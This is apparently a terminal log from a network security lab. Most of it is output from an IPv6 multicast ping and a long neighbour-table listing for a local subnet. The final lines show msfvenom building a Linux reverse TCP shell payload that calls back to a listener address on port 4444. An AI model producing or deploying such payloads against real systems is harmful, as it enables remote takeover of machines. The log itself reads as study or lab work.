64 bytes from fe80::250:56ff:fe97:5262%ens33: icmp_seq=1 ttl=64 time=2.74 ms
64 bytes from fe80::250:56ff:fe97:8149%ens33: icmp_seq=1 ttl=64 time=2.74 ms
64 bytes from fe80::250:56ff:fe97:b096%ens33: icmp_seq=1 ttl=64 time=2.79 ms
64 bytes from fe80::250:56ff:fe97:3a4a%ens33: icmp_seq=1 ttl=64 time=2.79 ms
64 bytes from fe80::250:56ff:fe97:aa04%ens33: icmp_seq=1 ttl=64 time=2.80 ms
64 bytes from fe80::250:56ff:fe97:bba5%ens33: icmp_seq=1 ttl=64 time=2.80 ms
64 bytes from fe80::250:56ff:fe97:38f%ens33: icmp_seq=1 ttl=64 time=2.81 ms
64 bytes from fe80::250:56ff:fe97:f213%ens33: icmp_seq=1 ttl=64 time=2.82 ms
64 bytes from fe80::250:56ff:fe97:2a56%ens33: icmp_seq=1 ttl=64 time=2.82 ms
64 bytes from fe80::250:56ff:fe97:51c9%ens33: icmp_seq=1 ttl=64 time=2.86 ms
64 bytes from fe80::250:56ff:fe97:d11d%ens33: icmp_seq=1 ttl=64 time=2.87 ms
64 bytes from fe80::250:56ff:fe97:d15b%ens33: icmp_seq=1 ttl=64 time=2.87 ms
64 bytes from fe80::250:56ff:fe97:2cbf%ens33: icmp_seq=1 ttl=64 time=2.87 ms
64 bytes from fe80::250:56ff:fe97:328a%ens33: icmp_seq=1 ttl=64 time=2.88 ms
64 bytes from fe80::250:56ff:fe97:6a6a%ens33: icmp_seq=1 ttl=64 time=2.88 ms
64 bytes from fe80::250:56ff:fe97:2cad%ens33: icmp_seq=1 ttl=64 time=2.88 ms
64 bytes from fe80::250:56ff:fe97:acf4%ens33: icmp_seq=1 ttl=64 time=2.88 ms
64 bytes from fe80::250:56ff:fe97:cdab%ens33: icmp_seq=1 ttl=64 time=2.88 ms
64 bytes from fe80::250:56ff:fe97:a04a%ens33: icmp_seq=1 ttl=64 time=2.88 ms
64 bytes from fe80::250:56ff:fe97:2598%ens33: icmp_seq=1 ttl=64 time=2.89 ms
64 bytes from fe80::250:56ff:fe97:6ae0%ens33: icmp_seq=1 ttl=64 time=2.89 ms
64 bytes from fe80::250:56ff:fe97:1b0e%ens33: icmp_seq=1 ttl=64 time=2.89 ms
64 bytes from fe80::250:56ff:fe97:acd0%ens33: icmp_seq=1 ttl=64 time=2.89 ms
64 bytes from fe80::250:56ff:fe97:86aa%ens33: icmp_seq=1 ttl=64 time=2.89 ms
64 bytes from fe80::250:56ff:fe97:775b%ens33: icmp_seq=1 ttl=64 time=2.89 ms
64 bytes from fe80::250:56ff:fe97:9ac%ens33: icmp_seq=1 ttl=64 time=2.90 ms
64 bytes from fe80::250:56ff:fe97:4966%ens33: icmp_seq=1 ttl=64 time=2.98 ms
64 bytes from fe80::250:56ff:fe97:a180%ens33: icmp_seq=1 ttl=64 time=2.98 ms
64 bytes from fe80::250:56ff:fe97:b428%ens33: icmp_seq=1 ttl=64 time=3.04 ms
64 bytes from fe80::250:56ff:fe97:f74f%ens33: icmp_seq=1 ttl=64 time=3.04 ms
64 bytes from fe80::250:56ff:fe97:6bbb%ens33: icmp_seq=1 ttl=64 time=3.10 ms
64 bytes from fe80::250:56ff:fe97:d5d9%ens33: icmp_seq=2 ttl=64 time=0.067 ms

--- ff02::1 ping statistics ---
2 packets transmitted, 2 received, +108 duplicates, 0% packet loss, time 1001ms
rtt min/avg/max/mdev = 0.067/2.263/3.098/0.648 ms
root@debian:/home/lsi# ip -6 neigh
fe80::250:56ff:fe97:a37c dev ens33 lladdr 00:50:56:97:a3:7c STALE
fe80::250:56ff:fe97:24d0 dev ens33 lladdr 00:50:56:97:24:d0 STALE
fe80::250:56ff:fe97:ee84 dev ens33 lladdr 00:50:56:97:ee:84 STALE
fe80::250:56ff:fe97:9ac dev ens33 lladdr 00:50:56:97:09:ac STALE
fe80::250:56ff:fe97:328a dev ens33 lladdr 00:50:56:97:32:8a STALE
fe80::250:56ff:fe97:e7f9 dev ens33 lladdr 00:50:56:97:e7:f9 STALE
fe80::250:56ff:fe97:981b dev ens33 lladdr 00:50:56:97:98:1b STALE
fe80::250:56ff:fe97:2b61 dev ens33 lladdr 00:50:56:97:2b:61 STALE
fe80::250:56ff:fe97:c15 dev ens33 lladdr 00:50:56:97:0c:15 STALE
fe80::250:56ff:fe97:5236 dev ens33 lladdr 00:50:56:97:52:36 STALE
fe80::250:56ff:fe97:91b6 dev ens33 lladdr 00:50:56:97:91:b6 STALE
fe80::250:56ff:fe97:afa5 dev ens33 lladdr 00:50:56:97:af:a5 STALE
fe80::250:56ff:fe97:b5d6 dev ens33 lladdr 00:50:56:97:b5:d6 STALE
fe80::250:56ff:fe97:c37a dev ens33 lladdr 00:50:56:97:c3:7a STALE
fe80::250:56ff:fe97:4966 dev ens33 lladdr 00:50:56:97:49:66 STALE
fe80::250:56ff:fe97:b20e dev ens33 lladdr 00:50:56:97:b2:0e STALE
fe80::250:56ff:fe97:bba5 dev ens33 lladdr 00:50:56:97:bb:a5 STALE
fe80::250:56ff:fe97:2a56 dev ens33 lladdr 00:50:56:97:2a:56 STALE
fe80::250:56ff:fe97:a104 dev ens33 lladdr 00:50:56:97:a1:04 STALE
fe80::250:56ff:fe97:65d7 dev ens33 lladdr 00:50:56:97:65:d7 STALE
fe80::250:56ff:fe97:7172 dev ens33 lladdr 00:50:56:97:71:72 STALE
fe80::250:56ff:fe97:c2e4 dev ens33 lladdr 00:50:56:97:c2:e4 STALE
fe80::250:56ff:fe97:3499 dev ens33 lladdr 00:50:56:97:34:99 STALE
fe80::250:56ff:fe97:2d96 dev ens33 lladdr 00:50:56:97:2d:96 STALE
fe80::250:56ff:fe97:2598 dev ens33 lladdr 00:50:56:97:25:98 STALE
fe80::250:56ff:fe97:2f8c dev ens33 lladdr 00:50:56:97:2f:8c router STALE
fe80::250:56ff:fe97:51c9 dev ens33 lladdr 00:50:56:97:51:c9 STALE
fe80::250:56ff:fe97:c41 dev ens33 lladdr 00:50:56:97:0c:41 STALE
fe80::250:56ff:fe97:6ba6 dev ens33 lladdr 00:50:56:97:6b:a6 STALE
fe80::250:56ff:fe97:5262 dev ens33 lladdr 00:50:56:97:52:62 STALE
fe80::250:56ff:fe97:fd2c dev ens33 lladdr 00:50:56:97:fd:2c STALE
fe80::250:56ff:fe97:c1b dev ens33 lladdr 00:50:56:97:0c:1b STALE
fe80::250:56ff:fe97:a35f dev ens33 lladdr 00:50:56:97:a3:5f STALE
fe80::250:56ff:fe97:3ef2 dev ens33 lladdr 00:50:56:97:3e:f2 STALE
fe80::250:56ff:fe97:4d2f dev ens33 lladdr 00:50:56:97:4d:2f STALE
fe80::250:56ff:fe97:acd0 dev ens33 lladdr 00:50:56:97:ac:d0 STALE
fe80::250:56ff:fe97:4d09 dev ens33 lladdr 00:50:56:97:4d:09 STALE
fe80::250:56ff:fe97:31fd dev ens33 lladdr 00:50:56:97:31:fd STALE
fe80::250:56ff:fe97:bd3f dev ens33 lladdr 00:50:56:97:bd:3f STALE
fe80::250:56ff:fe97:45e5 dev ens33 lladdr 00:50:56:97:45:e5 STALE
fe80::250:56ff:fe97:60d0 dev ens33 lladdr 00:50:56:97:60:d0 STALE
fe80::250:56ff:fe97:b096 dev ens33 lladdr 00:50:56:97:b0:96 STALE
fe80::250:56ff:fe97:f606 dev ens33 lladdr 00:50:56:97:f6:06 STALE
fe80::250:56ff:fe97:86aa dev ens33 lladdr 00:50:56:97:86:aa STALE
fe80::250:56ff:fe97:1432 dev ens33 lladdr 00:50:56:97:14:32 STALE
fe80::250:56ff:fe97:c4ba dev ens33 lladdr 00:50:56:97:c4:ba STALE
fe80::250:56ff:fe97:c2b1 dev ens33 lladdr 00:50:56:97:c2:b1 STALE
fe80::250:56ff:fe97:4ea5 dev ens33 lladdr 00:50:56:97:4e:a5 STALE
fe80::250:56ff:fe97:ac5e dev ens33 lladdr 00:50:56:97:ac:5e STALE
fe80::250:56ff:fe97:b13 dev ens33 lladdr 00:50:56:97:0b:13 STALE
fe80::250:56ff:fe97:7bab dev ens33 lladdr 00:50:56:97:7b:ab STALE
fe80::250:56ff:fe97:2493 dev ens33 lladdr 00:50:56:97:24:93 STALE
fe80::250:56ff:fe97:32d5 dev ens33 lladdr 00:50:56:97:32:d5 STALE
fe80::250:56ff:fe97:2ad7 dev ens33 lladdr 00:50:56:97:2a:d7 STALE
fe80::250:56ff:fe97:5aa5 dev ens33 lladdr 00:50:56:97:5a:a5 STALE
fe80::250:56ff:fe97:35b3 dev ens33 lladdr 00:50:56:97:35:b3 STALE
fe80::250:56ff:fe97:807f dev ens33 lladdr 00:50:56:97:80:7f router STALE
fe80::250:56ff:fe97:e989 dev ens33 lladdr 00:50:56:97:e9:89 STALE
fe80::250:56ff:fe97:11bc dev ens33 lladdr 00:50:56:97:11:bc STALE
fe80::250:56ff:fe97:38a4 dev ens33 lladdr 00:50:56:97:38:a4 STALE
fe80::250:56ff:fe97:a6a dev ens33 lladdr 00:50:56:97:0a:6a STALE
fe80::250:56ff:fe97:b9f7 dev ens33 lladdr 00:50:56:97:b9:f7 STALE
fe80::250:56ff:fe97:29f2 dev ens33 lladdr 00:50:56:97:29:f2 router STALE
fe80::250:56ff:fe97:8c07 dev ens33 lladdr 00:50:56:97:8c:07 STALE
fe80::250:56ff:fe97:70ac dev ens33 lladdr 00:50:56:97:70:ac STALE
fe80::250:56ff:fe97:987c dev ens33 lladdr 00:50:56:97:98:7c STALE
fe80::250:56ff:fe97:68ea dev ens33 lladdr 00:50:56:97:68:ea STALE
fe80::250:56ff:fe97:6692 dev ens33 lladdr 00:50:56:97:66:92 STALE
fe80::250:56ff:fe97:6ae0 dev ens33 lladdr 00:50:56:97:6a:e0 STALE
fe80::250:56ff:fe97:d1e1 dev ens33 lladdr 00:50:56:97:d1:e1 router STALE
fe80::250:56ff:fe97:ffb9 dev ens33 lladdr 00:50:56:97:ff:b9 STALE
fe80::250:56ff:fe97:114a dev ens33 lladdr 00:50:56:97:11:4a STALE
fe80::250:56ff:fe97:d11d dev ens33 lladdr 00:50:56:97:d1:1d STALE
fe80::250:56ff:fe97:6d5c dev ens33 lladdr 00:50:56:97:6d:5c STALE
fe80::250:56ff:fe97:4965 dev ens33 lladdr 00:50:56:97:49:65 STALE
fe80::250:56ff:fe97:f3e5 dev ens33 lladdr 00:50:56:97:f3:e5 STALE
fe80::250:56ff:fe97:4808 dev ens33 lladdr 00:50:56:97:48:08 STALE
fe80::250:56ff:fe97:380 dev ens33 lladdr 00:50:56:97:03:80 STALE
fe80::250:56ff:fe97:97c0 dev ens33 lladdr 00:50:56:97:97:c0 STALE
fe80::250:56ff:fe97:2cad dev ens33 lladdr 00:50:56:97:2c:ad STALE
fe80::250:56ff:fe97:f213 dev ens33 lladdr 00:50:56:97:f2:13 STALE
fe80::250:56ff:fe97:809b dev ens33 lladdr 00:50:56:97:80:9b STALE
fe80::250:56ff:fe97:8837 dev ens33 lladdr 00:50:56:97:88:37 STALE
fe80::250:56ff:fe97:1562 dev ens33 lladdr 00:50:56:97:15:62 STALE
fe80::250:56ff:fe97:ba37 dev ens33 lladdr 00:50:56:97:ba:37 STALE
fe80::250:56ff:fe97:6bbb dev ens33 lladdr 00:50:56:97:6b:bb STALE
fe80::250:56ff:fe97:ffac dev ens33 lladdr 00:50:56:97:ff:ac STALE
fe80::250:56ff:fe97:fc95 dev ens33 lladdr 00:50:56:97:fc:95 STALE
fe80::250:56ff:fe97:5846 dev ens33 lladdr 00:50:56:97:58:46 STALE
fe80::250:56ff:fe97:3d5b dev ens33 lladdr 00:50:56:97:3d:5b STALE
fe80::250:56ff:fe97:2561 dev ens33 lladdr 00:50:56:97:25:61 STALE
fe80::250:56ff:fe97:e534 dev ens33 lladdr 00:50:56:97:e5:34 STALE
fe80::250:56ff:fe97:2005 dev ens33 lladdr 00:50:56:97:20:05 STALE
fe80::250:56ff:fe97:6d78 dev ens33 lladdr 00:50:56:97:6d:78 STALE
fe80::250:56ff:fe97:8415 dev ens33 lladdr 00:50:56:97:84:15 STALE
fe80::250:56ff:fe97:a04a dev ens33 lladdr 00:50:56:97:a0:4a router STALE
fe80::250:56ff:fe97:169c dev ens33 lladdr 00:50:56:97:16:9c STALE
fe80::250:56ff:fe97:293a dev ens33 lladdr 00:50:56:97:29:3a STALE
fe80::250:56ff:fe97:62b2 dev ens33 lladdr 00:50:56:97:62:b2 STALE
fe80::250:56ff:fe97:f74f dev ens33 lladdr 00:50:56:97:f7:4f STALE
fe80::250:56ff:fe97:a0d5 dev ens33 lladdr 00:50:56:97:a0:d5 STALE
fe80::250:56ff:fe97:1a26 dev ens33 lladdr 00:50:56:97:1a:26 STALE
fe80::250:56ff:fe97:28ca dev ens33 lladdr 00:50:56:97:28:ca router STALE
fe80::250:56ff:fe97:7a37 dev ens33 lladdr 00:50:56:97:7a:37 STALE
fe80::250:56ff:fe97:5993 dev ens33 lladdr 00:50:56:97:59:93 STALE
fe80::250:56ff:fe97:2a5e dev ens33 lladdr 00:50:56:97:2a:5e STALE
fe80::250:56ff:fe97:1b0e dev ens33 lladdr 00:50:56:97:1b:0e STALE
fe80::250:56ff:fe97:b10b dev ens33 lladdr 00:50:56:97:b1:0b STALE
fe80::250:56ff:fe97:2119 dev ens33 lladdr 00:50:56:97:21:19 STALE
fe80::250:56ff:fe97:fbc9 dev ens33 lladdr 00:50:56:97:fb:c9 STALE
fe80::250:56ff:fe97:3a4a dev ens33 lladdr 00:50:56:97:3a:4a STALE
fe80::250:56ff:fe97:53dd dev ens33 lladdr 00:50:56:97:53:dd STALE
fe80::250:56ff:fe97:95ff dev ens33 lladdr 00:50:56:97:95:ff STALE
fe80::250:56ff:fe97:fb05 dev ens33 lladdr 00:50:56:97:fb:05 STALE
fe80::250:56ff:fe97:faf7 dev ens33 lladdr 00:50:56:97:fa:f7 STALE
fe80::250:56ff:fe97:555e dev ens33 lladdr 00:50:56:97:55:5e STALE
fe80::250:56ff:fe97:1b89 dev ens33 lladdr 00:50:56:97:1b:89 STALE
fe80::250:56ff:fe97:38f dev ens33 lladdr 00:50:56:97:03:8f STALE
fe80::250:56ff:fe97:d1a4 dev ens33 lladdr 00:50:56:97:d1:a4 STALE
fe80::250:56ff:fe97:d047 dev ens33 lladdr 00:50:56:97:d0:47 STALE
fe80::250:56ff:fe97:9515 dev ens33 lladdr 00:50:56:97:95:15 STALE
fe80::250:56ff:fe97:2d42 dev ens33 lladdr 00:50:56:97:2d:42 router STALE
fe80::250:56ff:fe97:c22e dev ens33 lladdr 00:50:56:97:c2:2e STALE
fe80::250:56ff:fe97:6a6a dev ens33 lladdr 00:50:56:97:6a:6a STALE
fe80::250:56ff:fe97:5417 dev ens33 lladdr 00:50:56:97:54:17 STALE
fe80::250:56ff:fe97:b428 dev ens33 lladdr 00:50:56:97:b4:28 STALE
fe80::250:56ff:fe97:343 dev ens33 lladdr 00:50:56:97:03:43 STALE
fe80::250:56ff:fe97:4ac1 dev ens33 lladdr 00:50:56:97:4a:c1 STALE
fe80::250:56ff:fe97:babb dev ens33 lladdr 00:50:56:97:ba:bb STALE
fe80::250:56ff:fe97:2cbf dev ens33 lladdr 00:50:56:97:2c:bf STALE
fe80::250:56ff:fe97:45dd dev ens33 lladdr 00:50:56:97:45:dd STALE
fe80::250:56ff:fe97:2c99 dev ens33 lladdr 00:50:56:97:2c:99 STALE
fe80::250:56ff:fe97:3bd6 dev ens33 lladdr 00:50:56:97:3b:d6 STALE
fe80::250:56ff:fe97:6e46 dev ens33 lladdr 00:50:56:97:6e:46 STALE
fe80::250:56ff:fe97:52af dev ens33 lladdr 00:50:56:97:52:af STALE
fe80::250:56ff:fe97:9482 dev ens33 lladdr 00:50:56:97:94:82 STALE
fe80::250:56ff:fe97:d15b dev ens33 lladdr 00:50:56:97:d1:5b STALE
fe80::250:56ff:fe97:cdab dev ens33 lladdr 00:50:56:97:cd:ab router STALE
fe80::250:56ff:fe97:340f dev ens33 lladdr 00:50:56:97:34:0f STALE
fe80::250:56ff:fe97:ce93 dev ens33 lladdr 00:50:56:97:ce:93 STALE
fe80::250:56ff:fe97:b055 dev ens33 lladdr 00:50:56:97:b0:55 STALE
fe80::250:56ff:fe97:fdc8 dev ens33 lladdr 00:50:56:97:fd:c8 STALE
fe80::250:56ff:fe97:b64a dev ens33 lladdr 00:50:56:97:b6:4a STALE
fe80::250:56ff:fe97:1dfd dev ens33 lladdr 00:50:56:97:1d:fd STALE
fe80::250:56ff:fe97:94ab dev ens33 lladdr 00:50:56:97:94:ab STALE
fe80::250:56ff:fe97:acf4 dev ens33 lladdr 00:50:56:97:ac:f4 STALE
fe80::250:56ff:fe97:d67e dev ens33 lladdr 00:50:56:97:d6:7e STALE
fe80::250:56ff:fe97:3b3b dev ens33 lladdr 00:50:56:97:3b:3b STALE
fe80::250:56ff:fe97:8149 dev ens33 lladdr 00:50:56:97:81:49 STALE
fe80::250:56ff:fe97:3026 dev ens33 lladdr 00:50:56:97:30:26 STALE
fe80::250:56ff:fe97:63a dev ens33 lladdr 00:50:56:97:06:3a STALE
fe80::250:56ff:fe97:2c14 dev ens33 lladdr 00:50:56:97:2c:14 STALE
fe80::250:56ff:fe97:41a8 dev ens33 lladdr 00:50:56:97:41:a8 STALE
fe80::250:56ff:fe97:be4b dev ens33 lladdr 00:50:56:97:be:4b STALE
fe80::250:56ff:fe97:9b6 dev ens33 lladdr 00:50:56:97:09:b6 STALE
fe80::250:56ff:fe97:5b23 dev ens33 lladdr 00:50:56:97:5b:23 STALE
fe80::250:56ff:fe97:5f22 dev ens33 lladdr 00:50:56:97:5f:22 STALE
fe80::250:56ff:fe97:71b2 dev ens33 lladdr 00:50:56:97:71:b2 STALE
fe80::250:56ff:fe97:a180 dev ens33 lladdr 00:50:56:97:a1:80 STALE
fe80::250:56ff:fe97:e8a dev ens33 lladdr 00:50:56:97:0e:8a router STALE
fe80::250:56ff:fe97:e2f6 dev ens33 lladdr 00:50:56:97:e2:f6 STALE
fe80::250:56ff:fe97:d0a2 dev ens33 lladdr 00:50:56:97:d0:a2 STALE
fe80::250:56ff:fe97:22 dev ens33 lladdr 00:50:56:97:00:22 STALE
fe80::250:56ff:fe97:aa04 dev ens33 lladdr 00:50:56:97:aa:04 STALE
fe80::250:56ff:fe97:ded1 dev ens33 lladdr 00:50:56:97:de:d1 STALE
fe80::250:56ff:fe97:53d9 dev ens33 lladdr 00:50:56:97:53:d9 STALE
fe80::250:56ff:fe97:259f dev ens33 lladdr 00:50:56:97:25:9f STALE
fe80::250:56ff:fe97:775b dev ens33 lladdr 00:50:56:97:77:5b STALE
fe80::250:56ff:fe97:3271 dev ens33 lladdr 00:50:56:97:32:71 STALE
fe80::250:56ff:fe97:7f95 dev ens33 lladdr 00:50:56:97:7f:95 router STALE
fe80::250:56ff:fe97:8cdc dev ens33 lladdr 00:50:56:97:8c:dc STALE
fe80::250:56ff:fe97:89c5 dev ens33 lladdr 00:50:56:97:89:c5 STALE
fe80::250:56ff:fe97:1158 dev ens33 lladdr 00:50:56:97:11:58 STALE
fe80::250:56ff:fe97:f813 dev ens33 lladdr 00:50:56:97:f8:13 STALE
fe80::250:56ff:fe97:29f0 dev ens33 lladdr 00:50:56:97:29:f0 STALE
fe80::250:56ff:fe97:2798 dev ens33 lladdr 00:50:56:97:27:98 router STALE
fe80::250:56ff:fe97:ee5b dev ens33 lladdr 00:50:56:97:ee:5b STALE
fe80::250:56ff:fe97:6605 dev ens33 lladdr 00:50:56:97:66:05 STALE

```




```bash
root@debian:/home/lsi# msfvenom -p linux/x86/shell/reverse_tcp LHOST=10.11.48.50 LPORT=4444 -f elf > payload.bin
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 123 bytes
Final size of elf file: 207 bytes

```
